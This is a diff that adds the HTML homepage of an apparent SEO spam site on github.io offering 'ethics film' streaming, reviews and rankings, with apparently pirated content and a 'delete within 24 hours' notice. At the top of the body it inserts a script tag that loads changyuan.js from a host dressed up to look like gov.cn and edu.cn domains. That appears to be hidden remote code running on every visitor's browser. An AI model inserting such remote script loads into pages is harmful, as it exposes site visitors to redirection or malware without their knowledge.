@@ -1,0 +1,621 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>在线伦理电影网 - 深度影视评论与高清资源_艺术电影在线观看</title>
+    <meta name="keywords" content="在线伦理电影网, 伦理电影, 艺术电影, 在线观看, 深度影评, zaixianlunlidianyingwang-top.github.io">
+    <meta name="description" content="在线伦理电影网(zaixianlunlidianyingwang-top.github.io)专注于艺术与伦理电影的高清在线观看，提供深度影评、导演专题与经典影片资源，探索电影背后的深层人性。">
+    <link rel="canonical" href="https://zaixianlunlidianyingwang-top.github.io">
+    <meta property="og:title" content="在线伦理电影网 - 深度艺术电影平台">
+    <meta property="og:description" content="探索伦理与人性的深度电影世界，高清在线观看与专业影评。">
+    <meta property="og:url" content="https://zaixianlunlidianyingwang-top.github.io">
+    <meta property="og:type" content="website">
+    <style>
+        /* 基础变量 - 瑞士风格 */
+        :root {
+            --bg-color: #ffffff;
+            --text-main: #111111;
+            --text-muted: #767676;
+            --accent-color: #d9531e; /* 赭石橙 */
+            --line-color: #e0e0e0;
+            --font-display: 'Helvetica Neue', Helvetica, 'Arial Black', sans-serif;
+            --font-body: 'Helvetica Neue', Helvetica, Arial, 'PingFang SC', 'Microsoft YaHei', sans-serif;
+            --font-mono: 'Menlo', 'Consolas', monospace;
+        }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: var(--font-body);
+            background-color: var(--bg-color);
+            color: var(--text-main);
+            line-height: 1.6;
+            -webkit-font-smoothing: antialiased;
+        }
+        a {
+            text-decoration: none;
+            color: var(--text-main);
+            transition: color 0.3s ease;
+        }
+        a:hover {
+            color: var(--accent-color);
+        }
+        ul { list-style: none; }
+        img { max-width: 100%; display: block; }
+
+        /* 容器 */
+        .container {
+            max-width: 1440px;
+            margin: 0 auto;
+            padding: 0 5vw;
+        }
+
+        /* 顶部导航 */
+        .header {
+            padding: 30px 0;
+            border-bottom: 1px solid var(--line-color);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .logo {
+            font-family: var(--font-display);
+            font-size: 1.5rem;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 0.05em;
+        }
+        .logo span { color: var(--accent-color); }
+        .nav-menu {
+            display: flex;
+            gap: 40px;
+        }
+        .nav-menu a {
+            font-size: 0.9rem;
+            font-weight: 500;
+            text-transform: uppercase;
+            letter-spacing: 0.05em;
+            position: relative;
+        }
+        .nav-menu a::after {
+            content: '';
+            position: absolute;
+            bottom: -4px;
+            left: 0;
+            width: 0;
+            height: 2px;
+            background: var(--accent-color);
+            transition: width 0.3s ease;
+        }
+        .nav-menu a:hover::after { width: 100%; }
+
+        /* Hero 区域 - 大标题 */
+        .hero {
+            padding: 120px 0 80px;
+            border-bottom: 1px solid var(--line-color);
+        }
+        .hero-label {
+            font-family: var(--font-mono);
+            font-size: 0.85rem;
+            color: var(--accent-color);
+            text-transform: uppercase;
+            letter-spacing: 0.1em;
+            margin-bottom: 30px;
+        }
+        .hero h1 {
+            font-family: var(--font-display);
+            font-size: clamp(3rem, 8vw, 7rem);
+            font-weight: 700;
+            line-height: 0.95;
+            letter-spacing: -0.03em;
+            margin-bottom: 40px;
+        }
+        .hero h1 em {
+            font-style: normal;
+            color: var(--accent-color);
+        }
+        .hero-desc {
+            font-size: 1.25rem;
+            color: var(--text-muted);
+            max-width: 600px;
+            line-height: 1.8;
+        }
+        .url-bar {
+            margin-top: 50px;
+            padding: 20px 0;
+            border-top: 1px solid var(--line-color);
+            border-bottom: 1px solid var(--line-color);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-family: var(--font-mono);
+            font-size: 0.9rem;
+        }
+        .url-bar a {
+            color: var(--accent-color);
+            font-weight: 700;
+        }
+
+        /* 通用栏目样式 */
+        .section {
+            padding: 100px 0;
+            border-bottom: 1px solid var(--line-color);
+        }
+        .section-header {
+            display: grid;
+            grid-template-columns: 1fr 3fr;
+            gap: 40px;
+            margin-bottom: 60px;
+            align-items: end;
+        }
+        .section-num {
+            font-family: var(--font-mono);
+            font-size: 1rem;
+            color: var(--accent-color);
+        }
+        .section-title {
+            font-family: var(--font-display);
+            font-size: clamp(2rem, 4vw, 3rem);
+            font-weight: 700;
+            letter-spacing: -0.02em;
+            line-height: 1.1;
+        }
+
+        /* 栏目1：深度影评 (大图+文字) */
+        .editorial-grid {
+            display: grid;
+            grid-template-columns: 5fr 7fr;
+            gap: 60px;
+            align-items: center;
+        }
+        .editorial-img {
+            width: 100%;
+            aspect-ratio: 3/4;
+            background: #f5f5f5;
+            overflow: hidden;
+        }
+        .editorial-img img { width: 100%; height: 100%; object-fit: cover; }
+        .editorial-content h3 {
+            font-family: var(--font-display);
+            font-size: 2rem;
+            font-weight: 700;
+            margin-bottom: 20px;
+            line-height: 1.2;
+        }
+        .editorial-content p {
+            font-size: 1.1rem;
+            color: var(--text-muted);
+            margin-bottom: 30px;
+            line-height: 1.8;
+        }
+        .btn-line {
+            display: inline-block;
+            padding: 12px 0;
+            font-size: 0.9rem;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.05em;
+            border-bottom: 2px solid var(--text-main);
+        }
+        .btn-line:hover {
+            border-bottom-color: var(--accent-color);
+            color: var(--accent-color);
+        }
+
+        /* 栏目2：经典片库 (网格) */
+        .film-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 40px;
+        }
+        .film-card {
+            cursor: pointer;
+        }
+        .film-poster {
+            width: 100%;
+            aspect-ratio: 2/3;
+            background: #f5f5f5;
+            margin-bottom: 20px;
+            overflow: hidden;
+        }
+        .film-poster img { width: 100%; height: 100%; object-fit: cover; filter: grayscale(100%); transition: filter 0.5s ease; }
+        .film-card:hover .film-poster img { filter: grayscale(0%); }
+        .film-info h3 {
+            font-size: 1.3rem;
+            font-weight: 700;
+            margin-bottom: 8px;
+        }
+        .film-meta {
+            font-family: var(--font-mono);
+            font-size: 0.8rem;
+            color: var(--text-muted);
+            text-transform: uppercase;
+        }
+
+        /* 栏目3：导演专题 (横向滚动) */
+        .director-scroll {
+            display: flex;
+            gap: 40px;
+            overflow-x: auto;
+            padding-bottom: 20px;
+            scrollbar-width: none;
+        }
+        .director-scroll::-webkit-scrollbar { display: none; }
+        .director-card {
+            min-width: 300px;
+            flex-shrink: 0;
+        }
+        .director-img {
+            width: 100%;
+            aspect-ratio: 1;
+            border-radius: 50%;
+            background: #f5f5f5;
+            margin-bottom: 20px;
+            overflow: hidden;
+        }
+        .director-img img { width: 100%; height: 100%; object-fit: cover; filter: grayscale(100%); }
+        .director-card h3 { font-size: 1.3rem; font-weight: 700; margin-bottom: 5px; }
+        .director-card p { font-size: 0.9rem; color: var(--text-muted); }
+
+        /* 栏目4：排行榜 (列表) */
+        .ranking-table {
+            width: 100%;
+        }
+        .rank-row {
+            display: grid;
+            grid-template-columns: 80px 1fr 150px 100px;
+            align-items: center;
+            padding: 25px 0;
+            border-bottom: 1px solid var(--line-color);
+            transition: background 0.3s ease;
+        }
+        .rank-row:hover { background: #f9f9f9; }
+        .rank-num {
+            font-family: var(--font-display);
+            font-size: 2rem;
+            font-weight: 700;
+            color: var(--line-color);
+        }
+        .rank-row:nth-child(1) .rank-num { color: var(--accent-color); }
+        .rank-row:nth-child(2) .rank-num { color: #555; }
+        .rank-row:nth-child(3) .rank-num { color: #777; }
+        .rank-title { font-size: 1.3rem; font-weight: 600; }
+        .rank-director { font-size: 0.9rem; color: var(--text-muted); }
+        .rank-score { text-align: right; font-family: var(--font-mono); font-size: 1.2rem; font-weight: 700; }
+
+        /* 栏目5：网站资讯 (图文列表) */
+        .news-list {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 60px;
+        }
+        .news-item {
+            padding-bottom: 30px;
+            border-bottom: 1px solid var(--line-color);
+        }
+        .news-date {
+            font-family: var(--font-mono);
+            font-size: 0.8rem;
+            color: var(--accent-color);
+            margin-bottom: 10px;
+        }
+        .news-item h3 { font-size: 1.2rem; font-weight: 600; margin-bottom: 10px; line-height: 1.4; }
+        .news-item p { font-size: 0.95rem; color: var(--text-muted); }
+
+        /* 栏目6：关于本站 */
+        .about-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 80px;
+        }
+        .about-text h2 {
+            font-family: var(--font-display);
+            font-size: 2.5rem;
+            font-weight: 700;
+            margin-bottom: 30px;
+            line-height: 1.2;
+        }
+        .about-text p {
+            font-size: 1.1rem;
+            color: var(--text-muted);
+            margin-bottom: 20px;
+            line-height: 1.8;
+        }
+        .url-box {
+            margin-top: 40px;
+            padding: 30px;
+            background: var(--text-main);
+            color: #fff;
+        }
+        .url-box p { color: #aaa; font-size: 0.9rem; margin-bottom: 10px; }
+        .url-box a { color: #fff; font-family: var(--font-mono); font-size: 1.2rem; word-break: break-all; }
+        .url-box a:hover { color: var(--accent-color); }
+
+        /* 页脚 */
+        .footer {
+            padding: 80px 0 40px;
+        }
+        .footer-top {
+            display: grid;
+            grid-template-columns: 2fr 1fr 1fr 1fr;
+            gap: 40px;
+            margin-bottom: 60px;
+        }
+        .footer-logo {
+            font-family: var(--font-display);
+            font-size: 2rem;
+            font-weight: 700;
+        }
+        .footer-logo span { color: var(--accent-color); }
+        .footer-col h4 {
+            font-size: 0.9rem;
+            text-transform: uppercase;
+            letter-spacing: 0.05em;
+            margin-bottom: 20px;
+        }
+        .footer-col ul li { margin-bottom: 12px; }
+        .footer-col a { font-size: 0.9rem; color: var(--text-muted); }
+        .footer-bottom {
+            padding-top: 30px;
+            border-top: 1px solid var(--line-color);
+            display: flex;
+            justify-content: space-between;
+            font-family: var(--font-mono);
+            font-size: 0.8rem;
+            color: var(--text-muted);
+        }
+        .footer-bottom a { color: var(--accent-color); }
+
+        /* 移动端响应式 */
+        @media (max-width: 1024px) {
+            .editorial-grid { grid-template-columns: 1fr; }
+            .film-grid { grid-template-columns: repeat(2, 1fr); }
+            .footer-top { grid-template-columns: 1fr 1fr; }
+        }
+        @media (max-width: 768px) {
+            .header { flex-direction: column; gap: 20px; }
+            .nav-menu { flex-wrap: wrap; justify-content: center; gap: 20px; }
+            .hero { padding: 60px 0; }
+            .section { padding: 60px 0; }
+            .section-header { grid-template-columns: 1fr; gap: 10px; }
+            .film-grid { grid-template-columns: 1fr; }
+            .rank-row { grid-template-columns: 40px 1fr 80px; }
+            .rank-director { display: none; }
+            .news-list { grid-template-columns: 1fr; gap: 30px; }
+            .about-grid { grid-template-columns: 1fr; gap: 40px; }
+            .footer-top { grid-template-columns: 1fr; }
+            .footer-bottom { flex-direction: column; gap: 10px; text-align: center; }
+        }
+    </style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/changyuan.js"></script>
+    <div class="container">
+        <!-- 顶部导航 -->
+        <header class="header">
+            <div class="logo">在线<span>伦理电影网</span></div>
+            <nav>
+                <ul class="nav-menu">
+                    <li><a href="#editorial">深度影评</a></li>
+                    <li><a href="#library">经典片库</a></li>
+                    <li><a href="#directors">导演专题</a></li>
+                    <li><a href="#ranking">影史排行</a></li>
+                    <li><a href="#about">关于本站</a></li>
+                </ul>
+            </nav>
+        </header>
+
+        <main>
+            <!-- Hero 区域 -->
+            <section class="hero">
+                <div class="hero-label">EST. 2024 / 深度电影平台</div>
+                <h1>探索电影的<br><em>伦理与人性</em>边界</h1>
+                <p class="hero-desc">在线伦理电影网是一个专注于艺术电影与伦理题材的在线观影平台。我们不仅提供高清影片资源，更致力于通过深度影评与导演专题，带您理解电影背后的深层思考。</p>
+                <div class="url-bar">
+                    <span>官方唯一网址：</span>
+                    <a href="https://zaixianlunlidianyingwang-top.github.io">https://zaixianlunlidianyingwang-top.github.io</a>
+                </div>
+            </section>
+
+            <!-- 栏目1：深度影评 -->
+            <section id="editorial" class="section">
+                <div class="section-header">
+                    <div class="section-num">01 / 深度影评</div>
+                    <h2 class="section-title">本期主编推荐<br>解构现代伦理困境</h2>
+                </div>
+                <div class="editorial-grid">
+                    <div class="editorial-img">
+                        <img src="https://images.unsplash.com/photo-1489599849927-2ee91cede3ba?ixlib=rb-4.0.3&auto=format&fit=crop&w=600&q=80" alt="电影画面">
+                    </div>
+                    <div class="editorial-content">
+                        <h3>当科技侵入隐私：<br>《监视资本主义》中的伦理悖论</h3>
+                        <p>在大数据与人工智能飞速发展的今天，我们究竟在享受便利，还是在出卖灵魂？本期影评深度剖析了近年来的几部科技伦理题材佳作，探讨技术进步与人性底线之间的永恒冲突。</p>
+                        <p>在线伦理电影网(zaixianlunlidianyingwang-top.github.io)认为，好的伦理电影不仅是娱乐，更是一面照向现实的镜子。</p>
+                        <a href="#" class="btn-line">阅读全文 #</a>
+                    </div>
+                </div>
+            </section>
+
+            <!-- 栏目2：经典片库 -->
+            <section id="library" class="section">
+                <div class="section-header">
+                    <div class="section-num">02 / 经典片库</div>
+                    <h2 class="section-title">必看的十部<br>伦理电影杰作</h2>
+                </div>
+                <div class="film-grid">
+                    <div class="film-card">
+                        <div class="film-poster"><img src="https://images.unsplash.com/photo-1536440136628-849c177e76a1?ixlib=rb-4.0.3&auto=format&fit=crop&w=400&q=80" alt="电影海报"></div>
+                        <div class="film-info">
+                            <h3><a href="#">七宗罪</a></h3>
+                            <p class="film-meta">1995 / 大卫·芬奇 / 犯罪</p>
+                        </div>
+                    </div>
+                    <div class="film-card">
+                        <div class="film-poster"><img src="https://images.unsplash.com/photo-1618519764620-7403abdbbf9a?ixlib=rb-4.0.3&auto=format&fit=crop&w=400&q=80" alt="电影海报"></div>
+                        <div class="film-info">
+                            <h3><a href="#">发条橙</a></h3>
+                            <p class="film-meta">1971 / 库布里克 / 科幻</p>
+                        </div>
+                    </div>
+                    <div class="film-card">
+                        <div class="film-poster"><img src="https://images.unsplash.com/photo-1542204165-65bf26472b9b?ixlib=rb-4.0.3&auto=format&fit=crop&w=400&q=80" alt="电影海报"></div>
+                        <div class="film-info">
+                            <h3><a href="#">浪潮</a></h3>
+                            <p class="film-meta">2008 / 丹尼斯·甘塞尔 / 剧情</p>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- 栏目3：导演专题 -->
+            <section id="directors" class="section">
+                <div class="section-header">
+                    <div class="section-num">03 / 导演专题</div>
+                    <h2 class="section-title">镜头背后的<br>伦理思考者</h2>
+                </div>
+                <div class="director-scroll">
+                    <div class="director-card">
+                        <div class="director-img"><img src="https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?ixlib=rb-4.0.3&auto=format&fit=crop&w=300&q=80" alt="导演"></div>
+                        <h3>朴赞郁</h3>
+                        <p>韩国 / 复仇与欲望的解构者</p>
+                    </div>
+                    <div class="director-card">
+                        <div class="director-img"><img src="https://images.unsplash.com/photo-1500648767791-00dcc994a43e?ixlib=rb-4.0.3&auto=format&fit=crop&w=300&q=80" alt="导演"></div>
+                        <h3>拉斯·冯·提尔</h3>
+                        <p>丹麦 / 挑战道德底线的影像实验</p>
+                    </div>
+                    <div class="director-card">
+                        <div class="director-img"><img src="https://images.unsplash.com/photo-1438761681033-6461ffad8d80?ixlib=rb-4.0.3&auto=format&fit=crop&w=300&q=80" alt="导演"></div>
+                        <h3>迈克尔·哈内克</h3>
+                        <p>奥地利 / 冷酷的人性观察者</p>
+                    </div>
+                </div>
+            </section>
+
+            <!-- 栏目4：影史排行 -->
+            <section id="ranking" class="section">
+                <div class="section-header">
+                    <div class="section-num">04 / 影史排行</div>
+                    <h2 class="section-title">编辑部评选<br>伦理电影 Top 10</h2>
+                </div>
+                <div class="ranking-table">
+                    <div class="rank-row">
+                        <div class="rank-num">01</div>
+                        <div class="rank-title"><a href="#">活着</a></div>
+                        <div class="rank-director">张艺谋 / 1994</div>
+                        <div class="rank-score">9.3</div>
+                    </div>
+                        <div class="rank-row">
+                        <div class="rank-num">02</div>
+                        <div class="rank-title"><a href="#">美丽人生</a></div>
+                        <div class="rank-director">罗伯托·贝尼尼 / 1997</div>
+                        <div class="rank-score">9.5</div>
+                    </div>
+                    <div class="rank-row">
+                        <div class="rank-num">03</div>
+                        <div class="rank-title"><a href="#">辛德勒的名单</a></div>
+                        <div class="rank-director">斯皮尔伯格 / 1993</div>
+                        <div class="rank-score">9.4</div>
+                    </div>
+                    <div class="rank-row">
+                        <div class="rank-num">04</div>
+                        <div class="rank-title"><a href="#">告白</a></div>
+                        <div class="rank-director">中岛哲也 / 2010</div>
+                        <div class="rank-score">8.7</div>
+                    </div>
+                    <div class="rank-row">
+                        <div class="rank-num">05</div>
+                        <div class="rank-title"><a href="#">狗镇</a></div>
+                        <div class="rank-director">拉斯·冯·提尔 / 2003</div>
+                        <div class="rank-score">8.4</div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- 栏目5：网站资讯 -->
+            <section id="news" class="section">
+                <div class="section-header">
+                    <div class="section-num">05 / 最新动态</div>
+                    <h2 class="section-title">平台公告<br>与观影指南</h2>
+                </div>
+                <div class="news-list">
+                    <div class="news-item">
+                        <div class="news-date">2024.05.20</div>
+                        <h3><a href="#">在线伦理电影网全新界面上线，聚焦深度阅读体验</a></h3>
+                        <p>我们重构了整个网站的设计语言，采用更纯粹的排版风格，让您专注于电影内容本身。</p>
+                    </div>
+                    <div class="news-item">
+                        <div class="news-date">2024.05.15</div>
+                        <h3><a href="#">本周观影指南：五部探讨家庭伦理的冷门佳作</a></h3>
+                        <p>家庭是社会的最小单元，也是伦理冲突最集中的场域。本周精选五部相关题材影片。</p>
+                    </div>
+                </div>
+            </section>
+
+            <!-- 栏目6：关于本站 -->
+            <section id="about" class="section">
+                <div class="section-header">
+                    <div class="section-num">06 / 关于本站</div>
+                    <h2 class="section-title">关于在线伦理电影网</h2>
+                </div>
+                <div class="about-grid">
+                    <div class="about-text">
+                        <h2>我们关注电影中的<br>人性深度</h2>
+                        <p>在线伦理电影网（zaixianlunlidianyingwang-top.github.io）成立于2024年，是一个非盈利性质的电影资源分享与评论平台。</p>
+                        <p>我们相信，电影是探讨伦理、道德与人性的最佳媒介之一。平台收录了大量涉及社会伦理、心理困境、道德抉择的经典与当代影片，并提供高清在线观看。</p>
+                        <p>请认准我们的官方唯一网址，收藏本站，与我们一起探索电影的深度。</p>
+                    </div>
+                    <div class="url-box">
+                        <p>官方唯一网址 / Official Website</p>
+                        <a href="https://zaixianlunlidianyingwang-top.github.io">https://zaixianlunlidianyingwang-top.github.io</a>
+                        <p style="margin-top:20px; color:#aaa;">本站所有内容仅供交流学习，请在下载后24小时内删除。</p>
+                    </div>
+                </div>
+            </section>
+        </main>
+
+        <!-- 页脚 -->
+        <footer class="footer">
+            <div class="footer-top">
+                <div class="footer-col">
+                    <div class="footer-logo">在线<span>伦理电影网</span></div>
+                    <p style="color:var(--text-muted); font-size:0.9rem; margin-top:15px; max-width:250px;">专注于深度电影内容与高清在线观看体验。</p>
+                </div>
+                <div class="footer-col">
+                    <h4>内容导航</h4>
+                    <ul>
+                        <li><a href="#editorial">深度影评</a></li>
+                        <li><a href="#library">经典片库</a></li>
+                        <li><a href="#directors">导演专题</a></li>
+                        <li><a href="#ranking">影史排行</a></li>
+                    </ul>
+                </div>
+                <div class="footer-col">
+                    <h4>帮助中心</h4>
+                    <ul>
+                        <li><a href="#">观影指南</a></li>
+                        <li><a href="#">清晰度说明</a></li>
+                        <li><a href="#">常见问题</a></li>
+                    </ul>
+                </div>
+                <div class="footer-col">
+                    <h4>关于我们</h4>
+                    <ul>
+                        <li><a href="#">平台介绍</a></li>
+                        <li><a href="#">联系方式</a></li>
+                        <li><a href="#">免责声明</a></li>
+                    </ul>
+                </div>
+            </div>
+            <div class="footer-bottom">
+                <span>Copyright © 2024 在线伦理电影网 | 关键词：在线伦理电影网</span>
+                <span>网址：<a href="https://zaixianlunlidianyingwang-top.github.io">https://zaixianlunlidianyingwang-top.github.io</a></span>
+            </div>
+        </footer>
+    </div>
+</body>
+</html>
